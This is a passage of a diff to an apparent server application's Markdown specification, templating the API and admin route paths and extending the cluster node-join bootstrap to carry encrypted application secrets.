-| `/api/v1/users/tokens/{token_id}` | DELETE | Revoke API token |
-| `/api/v1/users/settings` | GET | Get user preferences |
-| `/api/v1/users/settings` | PATCH | Update user preferences |
-| `/api/v1/users/security/password` | POST | Change password |
-| `/api/v1/users/security/sessions` | GET | List active sessions |
-| `/api/v1/users/security/sessions/{session_id}` | DELETE | Revoke session |
-| `/api/v1/users/security/2fa` | GET | Get 2FA status |
-| `/api/v1/users/security/2fa/enable` | POST | Enable 2FA |
-| `/api/v1/users/security/2fa/disable` | POST | Disable 2FA |
-| `/api/v1/users/security/recovery` | GET | Get recovery keys status |
-| `/api/v1/users/security/recovery/regenerate` | POST | Regenerate recovery keys |
-| `/api/v1/users/security/passkeys` | GET | List passkeys |
-| `/api/v1/users/security/passkeys` | POST | Register new passkey |
-| `/api/v1/users/security/passkeys/{passkey_id}` | DELETE | Remove passkey |
+| `/api/{api_version}/users` | GET | Current user's profile |
+| `/api/{api_version}/users` | PATCH | Update current user's profile |
+| `/api/{api_version}/users/tokens` | GET | List user's API tokens |
+| `/api/{api_version}/users/tokens` | POST | Create API token |
+| `/api/{api_version}/users/tokens/{token_id}` | GET | Get token details |
+| `/api/{api_version}/users/tokens/{token_id}` | DELETE | Revoke API token |
+| `/api/{api_version}/users/settings` | GET | Get user preferences |
+| `/api/{api_version}/users/settings` | PATCH | Update user preferences |
+| `/api/{api_version}/users/security/password` | POST | Change password |
+| `/api/{api_version}/users/security/sessions` | GET | List active sessions |
+| `/api/{api_version}/users/security/sessions/{session_id}` | DELETE | Revoke session |
+| `/api/{api_version}/users/security/2fa` | GET | Get 2FA status |
+| `/api/{api_version}/users/security/2fa/enable` | POST | Enable 2FA |
+| `/api/{api_version}/users/security/2fa/disable` | POST | Disable 2FA |
+| `/api/{api_version}/users/security/recovery` | GET | Get recovery keys status |
+| `/api/{api_version}/users/security/recovery/regenerate` | POST | Regenerate recovery keys |
+| `/api/{api_version}/users/security/passkeys` | GET | List passkeys |
+| `/api/{api_version}/users/security/passkeys` | POST | Register new passkey |
+| `/api/{api_version}/users/security/passkeys/{passkey_id}` | DELETE | Remove passkey |
 
-### Orgs (`/api/v1/orgs/`)
+### Orgs (`/api/{api_version}/orgs/`)
 
 Organizations - only for projects with multi-user collaboration.
 
-**Route scoping:** All routes use org slug. Client gets own orgs from `GET /api/v1/orgs`.
+**Route scoping:** All routes use org slug. Client gets own orgs from `GET /api/{api_version}/orgs`.
 
 | Endpoint | Method | Description |
 |----------|--------|-------------|
-| `/api/v1/orgs` | GET | Own orgs (user) or list all (admin) |
-| `/api/v1/orgs` | POST | Create organization |
-| `/api/v1/orgs/{slug}` | GET | Get organization details |
-| `/api/v1/orgs/{slug}` | PATCH | Update organization |
-| `/api/v1/orgs/{slug}` | DELETE | Delete organization |
-| `/api/v1/orgs/{slug}/settings` | GET | Get org settings |
-| `/api/v1/orgs/{slug}/settings` | PATCH | Update org settings |
-| `/api/v1/orgs/{slug}/tokens` | GET | List org API tokens |
-| `/api/v1/orgs/{slug}/tokens` | POST | Create org API token |
-| `/api/v1/orgs/{slug}/tokens/{token_id}` | GET | Get token details |
-| `/api/v1/orgs/{slug}/tokens/{token_id}` | DELETE | Revoke token |
-| `/api/v1/orgs/{slug}/members` | GET | List members |
-| `/api/v1/orgs/{slug}/members` | POST | Add member |
-| `/api/v1/orgs/{slug}/members/{member_id}` | GET | Get member details |
-| `/api/v1/orgs/{slug}/members/{member_id}` | PATCH | Update member role |
-| `/api/v1/orgs/{slug}/members/{member_id}` | DELETE | Remove member |
-| `/api/v1/orgs/{slug}/invites` | GET | List pending invites |
-| `/api/v1/orgs/{slug}/invites` | POST | Create invite |
-| `/api/v1/orgs/{slug}/invites/{invite_id}` | DELETE | Revoke invite |
-| `/api/v1/orgs/{slug}/roles` | GET | List organization roles |
-| `/api/v1/orgs/{slug}/roles` | POST | Create custom role |
-| `/api/v1/orgs/{slug}/roles/{role_id}` | PATCH | Update role |
-| `/api/v1/orgs/{slug}/roles/{role_id}` | DELETE | Delete role |
-| `/api/v1/orgs/{slug}/security/audit` | GET | List audit events (paginated) |
-| `/api/v1/orgs/{slug}/security/audit/export` | POST | Request audit export |
-| `/api/v1/orgs/{slug}/security/audit/export/{export_id}` | GET | Download audit export |
-| `/api/v1/orgs/{slug}/security/audit/retention` | GET | Get retention settings |
-| `/api/v1/orgs/{slug}/security/audit/retention` | PATCH | Update retention (org owner only) |
-| `/api/v1/orgs/{slug}/security/sessions` | GET | List org-wide sessions |
+| `/api/{api_version}/orgs` | GET | Own orgs (user) or list all (admin) |
+| `/api/{api_version}/orgs` | POST | Create organization |
+| `/api/{api_version}/orgs/{slug}` | GET | Get organization details |
+| `/api/{api_version}/orgs/{slug}` | PATCH | Update organization |
+| `/api/{api_version}/orgs/{slug}` | DELETE | Delete organization |
+| `/api/{api_version}/orgs/{slug}/settings` | GET | Get org settings |
+| `/api/{api_version}/orgs/{slug}/settings` | PATCH | Update org settings |
+| `/api/{api_version}/orgs/{slug}/tokens` | GET | List org API tokens |
+| `/api/{api_version}/orgs/{slug}/tokens` | POST | Create org API token |
+| `/api/{api_version}/orgs/{slug}/tokens/{token_id}` | GET | Get token details |
+| `/api/{api_version}/orgs/{slug}/tokens/{token_id}` | DELETE | Revoke token |
+| `/api/{api_version}/orgs/{slug}/members` | GET | List members |
+| `/api/{api_version}/orgs/{slug}/members` | POST | Add member |
+| `/api/{api_version}/orgs/{slug}/members/{member_id}` | GET | Get member details |
+| `/api/{api_version}/orgs/{slug}/members/{member_id}` | PATCH | Update member role |
+| `/api/{api_version}/orgs/{slug}/members/{member_id}` | DELETE | Remove member |
+| `/api/{api_version}/orgs/{slug}/invites` | GET | List pending invites |
+| `/api/{api_version}/orgs/{slug}/invites` | POST | Create invite |
+| `/api/{api_version}/orgs/{slug}/invites/{invite_id}` | DELETE | Revoke invite |
+| `/api/{api_version}/orgs/{slug}/roles` | GET | List organization roles |
+| `/api/{api_version}/orgs/{slug}/roles` | POST | Create custom role |
+| `/api/{api_version}/orgs/{slug}/roles/{role_id}` | PATCH | Update role |
+| `/api/{api_version}/orgs/{slug}/roles/{role_id}` | DELETE | Delete role |
+| `/api/{api_version}/orgs/{slug}/security/audit` | GET | List audit events (paginated) |
+| `/api/{api_version}/orgs/{slug}/security/audit/export` | POST | Request audit export |
+| `/api/{api_version}/orgs/{slug}/security/audit/export/{export_id}` | GET | Download audit export |
+| `/api/{api_version}/orgs/{slug}/security/audit/retention` | GET | Get retention settings |
+| `/api/{api_version}/orgs/{slug}/security/audit/retention` | PATCH | Update retention (org owner only) |
+| `/api/{api_version}/orgs/{slug}/security/sessions` | GET | List org-wide sessions |
 
-### Admin - Server (`/api/v1/admin/server/`)
-
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/api/v1/admin/server/setup` | GET | Get setup status (is_complete, current_step) |
-| `/api/v1/admin/server/setup/verify` | POST | Verify setup token |
-| `/api/v1/admin/server/setup/account` | POST | Create admin account (Step 1) |
-| `/api/v1/admin/server/setup/token` | POST | Generate API token (Step 2) |
-| `/api/v1/admin/server/setup/config` | POST | Save server config (Step 3) |
-| `/api/v1/admin/server/setup/security` | POST | Security settings - backup password, 2FA (Step 4) |
-| `/api/v1/admin/server/setup/services` | POST | Configure services (Step 5) |
-| `/api/v1/admin/server/setup/complete` | POST | Complete setup wizard (Step 6) |
-| `/api/v1/admin/server/settings` | GET | Get server settings |
-| `/api/v1/admin/server/settings` | PATCH | Update server settings |
-| `/api/v1/admin/server/status` | GET | Server status (detailed, admin-only) |
-| `/api/v1/admin/server/stats` | GET | Statistics |
-| `/api/v1/admin/server/restart` | POST | Restart server |
-
-### Admin - Server Roles (`/api/v1/admin/server/roles/`)
+### Admin - Server (`/api/{api_version}/{admin_path}/server/`)
 
 | Endpoint | Method | Description |
 |----------|--------|-------------|
-| `/api/v1/admin/server/roles` | GET | List roles |
-| `/api/v1/admin/server/roles` | POST | Create role |
-| `/api/v1/admin/server/roles/{id}` | GET | Get role details |
-| `/api/v1/admin/server/roles/{id}` | PATCH | Update role |
-| `/api/v1/admin/server/roles/{id}` | DELETE | Delete role |
+| `/api/{api_version}/{admin_path}/server/setup` | GET | Get setup status (is_complete, current_step) |
+| `/api/{api_version}/{admin_path}/server/setup/verify` | POST | Verify setup token |
+| `/api/{api_version}/{admin_path}/server/setup/account` | POST | Create admin account (Step 1) |
+| `/api/{api_version}/{admin_path}/server/setup/token` | POST | Generate API token (Step 2) |
+| `/api/{api_version}/{admin_path}/server/setup/config` | POST | Save server config (Step 3) |
+| `/api/{api_version}/{admin_path}/server/setup/security` | POST | Security settings - backup password, 2FA (Step 4) |
+| `/api/{api_version}/{admin_path}/server/setup/services` | POST | Configure services (Step 5) |
+| `/api/{api_version}/{admin_path}/server/setup/complete` | POST | Complete setup wizard (Step 6) |
+| `/api/{api_version}/{admin_path}/server/settings` | GET | Get server settings |
+| `/api/{api_version}/{admin_path}/server/settings` | PATCH | Update server settings |
+| `/api/{api_version}/{admin_path}/server/status` | GET | Server status (detailed, admin-only) |
+| `/api/{api_version}/{admin_path}/server/stats` | GET | Statistics |
+| `/api/{api_version}/{admin_path}/server/restart` | POST | Restart server |
 
-### Admin - User Invites (`/api/v1/admin/server/users/invites/`)
+### Admin - Server Roles (`/api/{api_version}/{admin_path}/server/roles/`)
+
+| Endpoint | Method | Description |
+|----------|--------|-------------|
+| `/api/{api_version}/{admin_path}/server/roles` | GET | List roles |
+| `/api/{api_version}/{admin_path}/server/roles` | POST | Create role |
+| `/api/{api_version}/{admin_path}/server/roles/{id}` | GET | Get role details |
+| `/api/{api_version}/{admin_path}/server/roles/{id}` | PATCH | Update role |
+| `/api/{api_version}/{admin_path}/server/roles/{id}` | DELETE | Delete role |
+
+### Admin - User Invites (`/api/{api_version}/{admin_path}/server/users/invites/`)
 
 User registration invite codes (multi-user apps only).
 
 | Endpoint | Method | Description |
 |----------|--------|-------------|
-| `/api/v1/admin/server/users/invites` | GET | List user invite codes |
-| `/api/v1/admin/server/users/invites` | POST | Create user invite code |
-| `/api/v1/admin/server/users/invites/{id}` | GET | Get invite details |
-| `/api/v1/admin/server/users/invites/{id}` | DELETE | Revoke invite |
+| `/api/{api_version}/{admin_path}/server/users/invites` | GET | List user invite codes |
+| `/api/{api_version}/{admin_path}/server/users/invites` | POST | Create user invite code |
+| `/api/{api_version}/{admin_path}/server/users/invites/{id}` | GET | Get invite details |
+| `/api/{api_version}/{admin_path}/server/users/invites/{id}` | DELETE | Revoke invite |
 
-### Admin - Server Admins (`/api/v1/admin/server/admins/`)
-
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/api/v1/admin/server/admins` | GET | List Server Admins |
-| `/api/v1/admin/server/admins/{id}` | GET | Get admin details |
-| `/api/v1/admin/server/admins/{id}` | DELETE | Delete admin |
-| `/api/v1/admin/server/admins/{id}/disable` | POST | Disable admin |
-| `/api/v1/admin/server/admins/{id}/enable` | POST | Enable admin |
-| `/api/v1/admin/server/admins/invite` | POST | Generate admin invite link |
-
-### Admin - Moderation Users (`/api/v1/admin/server/moderation/users/`)
+### Admin - Server Admins (`/api/{api_version}/{admin_path}/server/admins/`)
 
 | Endpoint | Method | Description |
 |----------|--------|-------------|
-| `/api/v1/admin/server/moderation/users` | GET | List all users |
-| `/api/v1/admin/server/moderation/users/{id}` | GET | Get user details |
-| `/api/v1/admin/server/moderation/users/{id}` | DELETE | Delete user |
-| `/api/v1/admin/server/moderation/users/disable` | POST | Disable user |
-| `/api/v1/admin/server/moderation/users/enable` | POST | Enable user |
-| `/api/v1/admin/server/moderation/users/impersonate` | POST | Get impersonation token |
+| `/api/{api_version}/{admin_path}/server/admins` | GET | List Server Admins |
+| `/api/{api_version}/{admin_path}/server/admins/{id}` | GET | Get admin details |
+| `/api/{api_version}/{admin_path}/server/admins/{id}` | DELETE | Delete admin |
+| `/api/{api_version}/{admin_path}/server/admins/{id}/disable` | POST | Disable admin |
+| `/api/{api_version}/{admin_path}/server/admins/{id}/enable` | POST | Enable admin |
+| `/api/{api_version}/{admin_path}/server/admins/invite` | POST | Generate admin invite link |
 
-### Admin - Moderation Orgs (`/api/v1/admin/server/moderation/orgs/`)
+### Admin - Moderation Users (`/api/{api_version}/{admin_path}/server/moderation/users/`)
+
+| Endpoint | Method | Description |
+|----------|--------|-------------|
+| `/api/{api_version}/{admin_path}/server/moderation/users` | GET | List all users |
+| `/api/{api_version}/{admin_path}/server/moderation/users/{id}` | GET | Get user details |
+| `/api/{api_version}/{admin_path}/server/moderation/users/{id}` | DELETE | Delete user |
+| `/api/{api_version}/{admin_path}/server/moderation/users/disable` | POST | Disable user |
+| `/api/{api_version}/{admin_path}/server/moderation/users/enable` | POST | Enable user |
+| `/api/{api_version}/{admin_path}/server/moderation/users/impersonate` | POST | Get impersonation token |
+
+### Admin - Moderation Orgs (`/api/{api_version}/{admin_path}/server/moderation/orgs/`)
 
 Moderation only - Server Admin does not manage org members/roles.
 
 | Endpoint | Method | Description |
 |----------|--------|-------------|
-| `/api/v1/admin/server/moderation/orgs` | GET | List all organizations |
-| `/api/v1/admin/server/moderation/orgs/{slug}` | GET | Get organization details |
-| `/api/v1/admin/server/moderation/orgs/{slug}` | DELETE | Delete organization |
-| `/api/v1/admin/server/moderation/orgs/{slug}/disable` | POST | Disable organization |
-| `/api/v1/admin/server/moderation/orgs/{slug}/enable` | POST | Enable organization |
+| `/api/{api_version}/{admin_path}/server/moderation/orgs` | GET | List all organizations |
+| `/api/{api_version}/{admin_path}/server/moderation/orgs/{slug}` | GET | Get organization details |
+| `/api/{api_version}/{admin_path}/server/moderation/orgs/{slug}` | DELETE | Delete organization |
+| `/api/{api_version}/{admin_path}/server/moderation/orgs/{slug}/disable` | POST | Disable organization |
+| `/api/{api_version}/{admin_path}/server/moderation/orgs/{slug}/enable` | POST | Enable organization |
 
-### Admin - Profile (`/api/v1/admin/profile/`)
-
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/api/v1/admin/profile` | GET | Get admin profile |
-| `/api/v1/admin/profile` | PATCH | Update admin profile (username, icon) |
-| `/api/v1/admin/profile/password` | POST | Change admin password |
-| `/api/v1/admin/profile/token` | GET | Get current API token (masked) |
-| `/api/v1/admin/profile/token` | POST | Regenerate API token (returns new token ONCE) |
-| `/api/v1/admin/profile/preferences` | GET | Get admin preferences (theme, notifications) |
-| `/api/v1/admin/profile/preferences` | PATCH | Update admin preferences |
-
-### Admin - Branding (`/api/v1/admin/server/branding/`)
+### Admin - Profile (`/api/{api_version}/{admin_path}/profile/`)
 
 | Endpoint | Method | Description |
 |----------|--------|-------------|
-| `/api/v1/admin/server/branding` | GET | Get branding settings |
-| `/api/v1/admin/server/branding` | PATCH | Update branding |
+| `/api/{api_version}/{admin_path}/profile` | GET | Get admin profile |
+| `/api/{api_version}/{admin_path}/profile` | PATCH | Update admin profile (username, icon) |
+| `/api/{api_version}/{admin_path}/profile/password` | POST | Change admin password |
+| `/api/{api_version}/{admin_path}/profile/token` | GET | Get current API token (masked) |
+| `/api/{api_version}/{admin_path}/profile/token` | POST | Regenerate API token (returns new token ONCE) |
+| `/api/{api_version}/{admin_path}/profile/preferences` | GET | Get admin preferences (theme, notifications) |
+| `/api/{api_version}/{admin_path}/profile/preferences` | PATCH | Update admin preferences |
 
-### Admin - SSL (`/api/v1/admin/server/ssl/`)
-
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/api/v1/admin/server/ssl` | GET | Get SSL settings |
-| `/api/v1/admin/server/ssl` | PATCH | Update SSL settings |
-| `/api/v1/admin/server/ssl/renew` | POST | Force certificate renewal |
-
-### Admin - Tor (`/api/v1/admin/server/tor/`)
+### Admin - Branding (`/api/{api_version}/{admin_path}/server/branding/`)
 
 | Endpoint | Method | Description |
 |----------|--------|-------------|
-| `/api/v1/admin/server/tor` | GET | Get Tor status |
-| `/api/v1/admin/server/tor` | PATCH | Update Tor settings |
-| `/api/v1/admin/server/tor/regenerate` | POST | Regenerate .onion address |
-| `/api/v1/admin/server/tor/vanity` | GET | Get vanity generation status |
-| `/api/v1/admin/server/tor/vanity` | POST | Start vanity generation |
-| `/api/v1/admin/server/tor/vanity` | DELETE | Cancel vanity generation |
-| `/api/v1/admin/server/tor/vanity/apply` | POST | Apply vanity address |
-| `/api/v1/admin/server/tor/import` | POST | Import external keys |
+| `/api/{api_version}/{admin_path}/server/branding` | GET | Get branding settings |
+| `/api/{api_version}/{admin_path}/server/branding` | PATCH | Update branding |
 
-### Admin - Web (robots.txt, security.txt) (`/api/v1/admin/server/web/`)
+### Admin - SSL (`/api/{api_version}/{admin_path}/server/ssl/`)
 
 | Endpoint | Method | Description |
 |----------|--------|-------------|
-| `/api/v1/admin/server/web` | GET | Get web settings |
-| `/api/v1/admin/server/web` | PATCH | Update web settings |
-| `/api/v1/admin/server/web/robots` | GET | Get robots.txt config |
-| `/api/v1/admin/server/web/robots` | PATCH | Update robots.txt |
-| `/api/v1/admin/server/web/robots/preview` | GET | Preview robots.txt |
-| `/api/v1/admin/server/web/security` | GET | Get security.txt config |
-| `/api/v1/admin/server/web/security` | PATCH | Update security.txt |
-| `/api/v1/admin/server/web/security/preview` | GET | Preview security.txt |
+| `/api/{api_version}/{admin_path}/server/ssl` | GET | Get SSL settings |
+| `/api/{api_version}/{admin_path}/server/ssl` | PATCH | Update SSL settings |
+| `/api/{api_version}/{admin_path}/server/ssl/renew` | POST | Force certificate renewal |
 
-### Admin - Pages (`/api/v1/admin/server/pages/`)
+### Admin - Tor (`/api/{api_version}/{admin_path}/server/tor/`)
 
 | Endpoint | Method | Description |
 |----------|--------|-------------|
-| `/api/v1/admin/server/pages` | GET | Get all page settings |
-| `/api/v1/admin/server/pages/about` | GET | Get about page content |
-| `/api/v1/admin/server/pages/about` | PATCH | Update about page content |
-| `/api/v1/admin/server/pages/privacy` | GET | Get privacy policy content |
-| `/api/v1/admin/server/pages/privacy` | PATCH | Update privacy policy content |
-| `/api/v1/admin/server/pages/contact` | GET | Get contact page settings |
-| `/api/v1/admin/server/pages/contact` | PATCH | Update contact page settings |
-| `/api/v1/admin/server/pages/help` | GET | Get help page content |
-| `/api/v1/admin/server/pages/help` | PATCH | Update help page content |
+| `/api/{api_version}/{admin_path}/server/tor` | GET | Get Tor status |
+| `/api/{api_version}/{admin_path}/server/tor` | PATCH | Update Tor settings |
+| `/api/{api_version}/{admin_path}/server/tor/regenerate` | POST | Regenerate .onion address |
+| `/api/{api_version}/{admin_path}/server/tor/vanity` | GET | Get vanity generation status |
+| `/api/{api_version}/{admin_path}/server/tor/vanity` | POST | Start vanity generation |
+| `/api/{api_version}/{admin_path}/server/tor/vanity` | DELETE | Cancel vanity generation |
+| `/api/{api_version}/{admin_path}/server/tor/vanity/apply` | POST | Apply vanity address |
+| `/api/{api_version}/{admin_path}/server/tor/import` | POST | Import external keys |
 
-### Admin - Email (`/api/v1/admin/server/email/`)
-
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/api/v1/admin/server/email` | GET | Get email settings |
-| `/api/v1/admin/server/email` | PATCH | Update email settings |
-| `/api/v1/admin/server/email/test` | POST | Send test email |
-| `/api/v1/admin/server/email/templates` | GET | List email templates |
-| `/api/v1/admin/server/email/templates/{name}` | GET | Get template |
-| `/api/v1/admin/server/email/templates/{name}` | PUT | Update template |
-| `/api/v1/admin/server/email/templates/{name}/reset` | POST | Reset to default |
-| `/api/v1/admin/server/email/templates/{name}/preview` | POST | Preview template |
-
-### Admin - Scheduler (`/api/v1/admin/server/scheduler/`)
+### Admin - Web (robots.txt, security.txt) (`/api/{api_version}/{admin_path}/server/web/`)
 
 | Endpoint | Method | Description |
 |----------|--------|-------------|
-| `/api/v1/admin/server/scheduler` | GET | List scheduled tasks |
-| `/api/v1/admin/server/scheduler/{id}` | GET | Get task details |
-| `/api/v1/admin/server/scheduler/{id}` | PATCH | Update task |
-| `/api/v1/admin/server/scheduler/{id}/run` | POST | Run task now |
-| `/api/v1/admin/server/scheduler/{id}/enable` | POST | Enable task |
-| `/api/v1/admin/server/scheduler/{id}/disable` | POST | Disable task |
+| `/api/{api_version}/{admin_path}/server/web` | GET | Get web settings |
+| `/api/{api_version}/{admin_path}/server/web` | PATCH | Update web settings |
+| `/api/{api_version}/{admin_path}/server/web/robots` | GET | Get robots.txt config |
+| `/api/{api_version}/{admin_path}/server/web/robots` | PATCH | Update robots.txt |
+| `/api/{api_version}/{admin_path}/server/web/robots/preview` | GET | Preview robots.txt |
+| `/api/{api_version}/{admin_path}/server/web/security` | GET | Get security.txt config |
+| `/api/{api_version}/{admin_path}/server/web/security` | PATCH | Update security.txt |
+| `/api/{api_version}/{admin_path}/server/web/security/preview` | GET | Preview security.txt |
 
-### Admin - Backup (`/api/v1/admin/server/backup/`)
-
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/api/v1/admin/server/backup` | GET | List backups |
-| `/api/v1/admin/server/backup` | POST | Create backup |
-| `/api/v1/admin/server/backup/{id}` | GET | Get backup details |
-| `/api/v1/admin/server/backup/{id}` | DELETE | Delete backup |
-| `/api/v1/admin/server/backup/{id}/download` | GET | Download backup file |
-| `/api/v1/admin/server/backup/restore` | POST | Restore from backup |
-
-### Admin - Logs (`/api/v1/admin/server/logs/`)
+### Admin - Pages (`/api/{api_version}/{admin_path}/server/pages/`)
 
 | Endpoint | Method | Description |
 |----------|--------|-------------|
-| `/api/v1/admin/server/logs` | GET | List log files |
-| `/api/v1/admin/server/logs/{type}` | GET | Get log entries |
-| `/api/v1/admin/server/logs/{type}/download` | GET | Download log file |
+| `/api/{api_version}/{admin_path}/server/pages` | GET | Get all page settings |
+| `/api/{api_version}/{admin_path}/server/pages/about` | GET | Get about page content |
+| `/api/{api_version}/{admin_path}/server/pages/about` | PATCH | Update about page content |
+| `/api/{api_version}/{admin_path}/server/pages/privacy` | GET | Get privacy policy content |
+| `/api/{api_version}/{admin_path}/server/pages/privacy` | PATCH | Update privacy policy content |
+| `/api/{api_version}/{admin_path}/server/pages/contact` | GET | Get contact page settings |
+| `/api/{api_version}/{admin_path}/server/pages/contact` | PATCH | Update contact page settings |
+| `/api/{api_version}/{admin_path}/server/pages/help` | GET | Get help page content |
+| `/api/{api_version}/{admin_path}/server/pages/help` | PATCH | Update help page content |
+
+### Admin - Email (`/api/{api_version}/{admin_path}/server/email/`)
+
+| Endpoint | Method | Description |
+|----------|--------|-------------|
+| `/api/{api_version}/{admin_path}/server/email` | GET | Get email settings |
+| `/api/{api_version}/{admin_path}/server/email` | PATCH | Update email settings |
+| `/api/{api_version}/{admin_path}/server/email/test` | POST | Send test email |
+| `/api/{api_version}/{admin_path}/server/email/templates` | GET | List email templates |
+| `/api/{api_version}/{admin_path}/server/email/templates/{name}` | GET | Get template |
+| `/api/{api_version}/{admin_path}/server/email/templates/{name}` | PUT | Update template |
+| `/api/{api_version}/{admin_path}/server/email/templates/{name}/reset` | POST | Reset to default |
+| `/api/{api_version}/{admin_path}/server/email/templates/{name}/preview` | POST | Preview template |
+
+### Admin - Scheduler (`/api/{api_version}/{admin_path}/server/scheduler/`)
+
+| Endpoint | Method | Description |
+|----------|--------|-------------|
+| `/api/{api_version}/{admin_path}/server/scheduler` | GET | List scheduled tasks |
+| `/api/{api_version}/{admin_path}/server/scheduler/{id}` | GET | Get task details |
+| `/api/{api_version}/{admin_path}/server/scheduler/{id}` | PATCH | Update task |
+| `/api/{api_version}/{admin_path}/server/scheduler/{id}/run` | POST | Run task now |
+| `/api/{api_version}/{admin_path}/server/scheduler/{id}/enable` | POST | Enable task |
+| `/api/{api_version}/{admin_path}/server/scheduler/{id}/disable` | POST | Disable task |
+
+### Admin - Backup (`/api/{api_version}/{admin_path}/server/backup/`)
+
+| Endpoint | Method | Description |
+|----------|--------|-------------|
+| `/api/{api_version}/{admin_path}/server/backup` | GET | List backups |
+| `/api/{api_version}/{admin_path}/server/backup` | POST | Create backup |
+| `/api/{api_version}/{admin_path}/server/backup/{id}` | GET | Get backup details |
+| `/api/{api_version}/{admin_path}/server/backup/{id}` | DELETE | Delete backup |
+| `/api/{api_version}/{admin_path}/server/backup/{id}/download` | GET | Download backup file |
+| `/api/{api_version}/{admin_path}/server/backup/restore` | POST | Restore from backup |
+
+### Admin - Logs (`/api/{api_version}/{admin_path}/server/logs/`)
+
+| Endpoint | Method | Description |
+|----------|--------|-------------|
+| `/api/{api_version}/{admin_path}/server/logs` | GET | List log files |
+| `/api/{api_version}/{admin_path}/server/logs/{type}` | GET | Get log entries |
+| `/api/{api_version}/{admin_path}/server/logs/{type}/download` | GET | Download log file |
 
 ## Email Templates (User-Related)
 
@@ -53199,7 +55206,7 @@ On restart, the application:
 
 **Method 2: Admin WebUI**
 
-`/admin/server/database`
+`/{admin_path}/server/database`
 
 | Element | Type | Description |
 |---------|------|-------------|
@@ -53296,7 +55303,7 @@ Settings can be stored in database OR config file. Sync between them:
 **SQLite → YAML (Export settings to file):**
 
 ```
-Admin WebUI: /admin/server/settings → "Export to YAML"
+Admin WebUI: /{admin_path}/server/settings → "Export to YAML"
          │
          ▼
 Read all settings from server.db
@@ -53455,16 +55462,16 @@ Local MariaDB INSERT                     Local PostgreSQL INSERT
 
 **On existing node:**
 
-1. Go to `/admin/server/nodes/add`
+1. Go to `/{admin_path}/server/nodes/add`
 2. Click "Generate Token" button
 3. Server generates:
    - Token: `node_{random_32_chars}`
-   - URL: `{proto}://wthr.top` (of this node)
+   - URL: `{proto}://{fqdn}` (of this node)
 4. Display token and URL to admin (copy buttons)
 
 **On new server:**
 
-1. Go to `/admin/server/nodes/add`
+1. Go to `/{admin_path}/server/nodes/add`
 2. Enter:
    - URL from existing node
    - Token from existing node
@@ -53479,7 +55486,7 @@ Local MariaDB INSERT                     Local PostgreSQL INSERT
 Existing Node                          New Node
      │                                      │
      ▼                                      │
-/admin/server/nodes/add               │
+/{admin_path}/server/nodes/add               │
      │                                      │
      ▼                                      │
 Generate Token                              │
@@ -53489,7 +55496,7 @@ Generate Token                              │
      └──────── Share token + URL ──────────►│
                                             │
                                             ▼
-                                   /admin/server/nodes/add
+                                   /{admin_path}/server/nodes/add
                                             │
                                             ▼
                                    Enter URL + Token
@@ -53508,7 +55515,7 @@ Generate Token                              │
 ```
 NEW NODE                                    EXISTING NODE
     │                                            │
-    │  1. POST /api/v1/admin/server/nodes/join   │
+    │  1. POST /api/{api_version}/{admin_path}/server/nodes/join   │
     │     Body: { "token": "node_xxx" }          │
     │─────────────────────────────────────────►  │
     │                                            │
@@ -53530,6 +55537,16 @@ NEW NODE                                    EXISTING NODE
    - Database connection (encrypted)             │
    - Encryption key for secrets                  │
    - Cluster ID                                  │
+   - All `app_secrets` rows (PART 11             │
+     → "Cryptographic Keys"):                    │
+       installation_secret,                      │
+       server.security.encryption_key            │
+       (delivered separately — already in        │
+       server.yml on existing nodes),            │
+       cookie_signing_key,                       │
+       csrf_token_secret                         │
+   (delivered inside the encrypted bootstrap     │
+    payload — NEVER on the wire in plaintext)    │
     │                                            │
     ▼                                            │
 6. Connect to remote database                    │
@@ -53543,7 +55560,7 @@ NEW NODE                                    EXISTING NODE
     │                                            │
     ▼                                            │
 8. Register self in nodes table                  │
-   - node_id: {hostname}                         │
+   - node_id: {host_name}                         │
    - status: online                              │
    - joined_at: now()                            │
     │                                            │
@@ -53560,7 +55577,7 @@ NEW NODE                                    EXISTING NODE
 
 #### Bootstrap Data Structure
 
-**Response from existing node (`POST /api/v1/admin/server/nodes/join`):**
+**Response from existing node (`POST /api/{api_version}/{admin_path}/server/nodes/join`):**
 
 ```json
 {
@@ -53714,7 +55731,7 @@ func updateHeartbeat(db *sql.DB, nodeID string) {
 
 **A node can only remove ITSELF from the cluster.**
 
-1. Go to `/admin/server/nodes/remove` (on the node to remove)
+1. Go to `/{admin_path}/server/nodes/remove` (on the node to remove)
 2. Click "Remove from Cluster"
 3. Confirmation modal: "Are you sure you want to remove {nodename} from the cluster?"
    - [Yes, Remove] [Cancel]
@@ -53728,7 +55745,7 @@ func updateHeartbeat(db *sql.DB, nodeID string) {
 
 #### Viewing Nodes
 
-**`/admin/server/nodes`** - Node list
+**`/{admin_path}/server/nodes`** - Node list
 
 | Column | Description |
 |--------|-------------|
@@ -53738,7 +55755,7 @@ func updateHeartbeat(db *sql.DB, nodeID string) {
 | Version | Application version |
 | Last Seen | Last heartbeat time |
 
-**`/admin/server/nodes/{node}`** - Node detail
+**`/{admin_path}/server/nodes/{node}`** - Node detail
 
 | Section | Contents |
 |---------|----------|
@@ -53752,8 +55769,8 @@ func updateHeartbeat(db *sql.DB, nodeID string) {
 
 | Setting | Default | Changeable |
 |---------|---------|------------|
-| Node ID | `{hostname}` | Yes, via `/admin/server/nodes/settings` |
-| Display Name | `{hostname}` | Yes |
+| Node ID | `{host_name}` | Yes, via `/{admin_path}/server/nodes/settings` |
+| Display Name | `{host_name}` | Yes |
 
 #### First Node Behavior
 
@@ -53763,7 +55780,7 @@ func updateHeartbeat(db *sql.DB, nodeID string) {
 Single Instance (SQLite)
          │
          ▼
-Admin goes to /admin/server/nodes/add
+Admin goes to /{admin_path}/server/nodes/add
          │
          ▼
 Clicks "Generate Token"
@@ -53784,23 +55801,23 @@ On confirm:
 
 | Route | Description |
 |-------|-------------|
-| `/admin/server/nodes` | List all nodes |
-| `/admin/server/nodes/add` | Add node (generate token OR join) |
-| `/admin/server/nodes/remove` | Remove THIS node from cluster |
-| `/admin/server/nodes/settings` | Node identity settings |
-| `/admin/server/nodes/{node}` | View specific node details |
+| `/{admin_path}/server/nodes` | List all nodes |
+| `/{admin_path}/server/nodes/add` | Add node (generate token OR join) |
+| `/{admin_path}/server/nodes/remove` | Remove THIS node from cluster |
